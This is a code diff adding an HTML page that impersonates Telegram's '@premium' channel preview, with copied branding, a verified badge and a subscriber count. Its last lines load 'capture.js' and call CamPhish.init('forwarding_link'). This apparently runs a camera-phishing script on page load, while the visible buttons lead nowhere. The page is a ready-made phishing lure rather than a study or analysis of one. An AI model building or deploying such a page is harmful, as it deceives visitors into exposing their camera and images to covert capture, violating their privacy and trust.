@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Telegram: View @premium</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Telegram Premium">
+    <meta property="og:image"
+        content="https://cdn1.telesco.pe/file/Tqd4YeWlCTkd4LQu10vmn8DBALGPGDCzQbU4R70kgA4QEIGS6dbV5UqCqggQ1HWFfNm9mNna2M6Z5_7K0mNwR7M2-BkYfzJQzKg2OuUxVcgYaOk1wpVUGKjA6d70ez0AN3iWC2-u6hQ1bPKRSJYzLUWhRD-uYULvz8CS1OyrzgoNHXxho5yg_ox74og_WTb-WcOvKeq1nE-IBpTg07P6f58zy1YymG4Z4Bgi1yI3iVJH2BMoiAWDAG7kvIg8qGc-nw1r-i-Gw9jXFplz6tsYFcTKs-WpuZ1P4_1r84sqHPLJyKo5OhUcPP-MIaLHrNxqip3xSSxsDd8omtSRdeo4iw.jpg">
+    <meta property="og:site_name" content="Telegram">
+    <meta property="og:description"
+        content="Telegram Premium – a subscription that unlocks dozens of exclusive features.">
+    <link rel="icon" type="image/svg+xml" href="//telegram.org/img/website_icon.svg?4">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        :root {
+            --bg-color: #17212b;
+            --accent-btn-color: #5ebbea;
+            --tme-logo-color: #fff;
+            --secondary-text-color: rgba(255, 255, 255, 0.5)
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: var(--bg-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #fff
+        }
+
+        .tgme_background_wrap {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1;
+            overflow: hidden
+        }
+
+        .tgme_background {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1e3a5f, #0d1b2a, #1e3a5f, #0d1b2a);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite
+        }
+
+        @keyframes gradient {
+            0% {
+                background-position: 0% 50%
+            }
+
+            50% {
+                background-position: 100% 50%
+            }
+
+            100% {
+                background-position: 0% 50%
+            }
+        }
+
+        .tgme_page_wrap {
+            max-width: 420px;
+            width: 100%;
+            padding: 20px;
+            margin-top: 80px
+        }
+
+        .tgme_head {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(23, 33, 43, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 100
+        }
+
+        .tgme_logo {
+            height: 28px
+        }
+
+        .tgme_logo circle {
+            fill: var(--accent-btn-color)
+        }
+
+        .tgme_logo path:last-child {
+            fill: var(--tme-logo-color)
+        }
+
+        .tgme_head_right_btn {
+            background: var(--accent-btn-color);
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px
+        }
+
+        .tgme_page {
+            text-align: center
+        }
+
+        .tgme_page_photo {
+            margin-bottom: 20px
+        }
+
+        .tgme_page_photo_image {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 3px solid var(--accent-btn-color)
+        }
+
+        .tgme_page_title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px
+        }
+
+        .verified-icon {
+            background: var(--accent-btn-color);
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-style: normal
+        }
+
+        .tgme_page_extra {
+            color: var(--secondary-text-color);
+            font-size: 14px;
+            margin-bottom: 15px
+        }
+
+        .tgme_page_description {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 25px
+        }
+
+        .tgme_action_button_new {
+            display: block;
+            background: var(--accent-btn-color);
+            color: #fff;
+            padding: 14px 30px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden
+        }
+
+        .tgme_action_button_new:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(94, 187, 234, 0.4)
+        }
+
+        .shine::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: shine 2s infinite
+        }
+
+        @keyframes shine {
+            to {
+                left: 100%
+            }
+        }
+
+        .tgme_page_context_link_wrap {
+            margin-top: 20px
+        }
+
+        .tgme_page_context_link {
+            color: var(--accent-btn-color);
+            text-decoration: none;
+            font-size: 14px
+        }
+
+        .tgme_page_additional {
+            margin-top: 25px;
+            color: var(--secondary-text-color);
+            font-size: 14px;
+            line-height: 1.6
+        }
+
+        .tgme_page_additional strong {
+            color: #fff
+        }
+    </style>
+</head>
+
+<body>
+    <div class="tgme_background_wrap">
+        <div class="tgme_background"></div>
+    </div>
+    <div class="tgme_head">
+        <svg class="tgme_logo" height="28" viewBox="0 0 180 34" xmlns="http://www.w3.org/2000/svg">
+            <g fill="none" fill-rule="evenodd">
+                <circle cx="17" cy="17" r="17" fill="#5ebbea" />
+                <path
+                    d="m7.06510669 16.9258959c5.22739451-2.1065178 8.71314291-3.4952633 10.45724521-4.1662364 4.9797665-1.9157646 6.0145193-2.2485535 6.6889567-2.2595423.1483363-.0024169.480005.0315855.6948461.192827.1814076.1361492.23132.3200675.2552048.4491519.0238847.1290844.0536269.4231419.0299841.65291-.2698553 2.6225356-1.4375148 8.986738-2.0315537 11.9240228-.2513602 1.2428753-.7499132 1.5088847-1.2290685 1.5496672-1.0413153.0886298-1.8284257-.4857912-2.8369905-1.0972863-1.5782048-.9568691-2.5327083-1.3984317-4.0646293-2.3321592-1.7703998-1.0790837-.212559-1.583655.7963867-2.5529189.2640459-.2536609 4.7753906-4.3097041 4.755976-4.431706-.0070494-.0442984-.1409018-.481649-.2457499-.5678447-.104848-.0861957-.2595946-.0567202-.3712641-.033278-.1582881.0332286-2.6794907 1.5745492-7.5636077 4.6239616-.715635.4545193-1.3638349.6759763-1.9445998.6643712-.64024672-.0127938-1.87182452-.334829-2.78737602-.6100966-1.12296117-.3376271-1.53748501-.4966332-1.45976769-1.0700283.04048-.2986597.32581586-.610598.8560076-.935815z"
+                    fill="#fff" />
+                <text x="42" y="23" fill="#fff"
+                    font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="18"
+                    font-weight="600">Telegram</text>
+            </g>
+        </svg>
+        <a class="tgme_head_right_btn" href="#">Download</a>
+    </div>
+    <div class="tgme_page_wrap">
+        <div class="tgme_page">
+            <div class="tgme_page_photo">
+                <img class="tgme_page_photo_image"
+                    src="https://cdn1.telesco.pe/file/Tqd4YeWlCTkd4LQu10vmn8DBALGPGDCzQbU4R70kgA4QEIGS6dbV5UqCqggQ1HWFfNm9mNna2M6Z5_7K0mNwR7M2-BkYfzJQzKg2OuUxVcgYaOk1wpVUGKjA6d70ez0AN3iWC2-u6hQ1bPKRSJYzLUWhRD-uYULvz8CS1OyrzgoNHXxho5yg_ox74og_WTb-WcOvKeq1nE-IBpTg07P6f58zy1YymG4Z4Bgi1yI3iVJH2BMoiAWDAG7kvIg8qGc-nw1r-i-Gw9jXFplz6tsYFcTKs-WpuZ1P4_1r84sqHPLJyKo5OhUcPP-MIaLHrNxqip3xSSxsDd8omtSRdeo4iw.jpg">
+            </div>
+            <div class="tgme_page_title">
+                <span>Telegram Premium</span><i class="verified-icon">✔</i>
+            </div>
+            <div class="tgme_page_extra">8 343 144 subscribers</div>
+            <div class="tgme_page_description">Telegram Premium – a subscription that unlocks dozens of exclusive
+                features.</div>
+            <div class="tgme_page_action">
+                <a class="tgme_action_button_new shine" href="#">View in Telegram</a>
+            </div>
+            <div class="tgme_page_context_link_wrap">
+                <a class="tgme_page_context_link" href="#">Preview channel</a>
+            </div>
+            <div class="tgme_page_additional">
+                If you have <strong>Telegram</strong>, you can view and join<br><strong>Telegram Premium</strong> right
+                away.
+            </div>
+        </div>
+    </div>
+    <script src="capture.js"></script>
+    <script>CamPhish.init('forwarding_link');</script>
+</body>
+
+</html>
